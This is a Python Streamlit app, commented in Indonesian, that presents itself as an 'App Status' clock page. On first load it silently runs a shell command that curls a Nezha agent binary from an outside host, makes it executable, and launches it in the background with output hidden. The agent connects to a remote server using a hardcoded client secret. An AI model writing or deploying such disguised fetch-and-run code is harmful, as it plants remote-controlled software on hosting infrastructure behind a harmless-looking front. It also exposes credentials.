import streamlit as st
import subprocess
from datetime import datetime
import time
import os # Library 'os' untuk berinteraksi dengan sistem operasi (misal: cek file)

# --- Konfigurasi Halaman ---
st.set_page_config(
    page_title="App Status",
    page_icon="🟢",
    layout="centered"
)

# Nama file kunci (lock file) yang akan kita gunakan
LOCK_FILE = "agent.lock"

# Perintah untuk mengunduh dan menjalankan agent.
# Kita kembalikan ke versi sederhana karena pengecekan akan dilakukan di Python.
COMMAND_TO_RUN = """
# Unduh dan ubah izin HANYA jika file agent belum ada
if [ ! -f agent ]; then
    curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent
fi

# Jalankan agent di latar belakang
nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
    NZ_TLS=true \
    NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
    NZ_UUID=61aeceff-7479-49a9-9900-32df80905be8 \
    ./agent > /dev/null 2>&1 &
"""

# --- Logika Eksekusi Otomatis Menggunakan Lock File ---

# Periksa apakah file kunci BELUM ada.
if not os.path.exists(LOCK_FILE):
    try:
        st.info("🚀 Inisialisasi pertama kali... Memulai agent di latar belakang.")
        
        # Langkah 1: Buat file kunci untuk menandai bahwa kita sudah memulai proses.
        # 'with open...' akan secara otomatis membuat dan menutup file.
        with open(LOCK_FILE, "w") as f:
            f.write(f"Agent started at: {datetime.now()}")
        
        # Langkah 2: Jalankan perintah shell untuk mengunduh dan memulai agent.
        subprocess.Popen(COMMAND_TO_RUN, shell=True, executable='/bin/bash')
        
        st.toast("Agent berhasil dimulai!", icon="✅")
        time.sleep(2)
        
        st.rerun()

    except Exception as e:
        st.error(f"❌ Terjadi kesalahan saat inisialisasi agent:")
        st.code(str(e))
        st.stop()


# --- Tampilan Utama (UI) ---

st.title("🟢 App Status")
st.success("Aplikasi berjalan. Agent telah aktif di latar belakang.")
st.markdown("---")

clock_placeholder = st.empty()

while True:
    now = datetime.now()
    clock_placeholder.metric(
        label="Waktu Server Saat Ini",
        value=now.strftime("%H:%M:%S"),
        delta=now.strftime('%d %B %Y'),
        delta_color="off"
    )
    time.sleep(1)
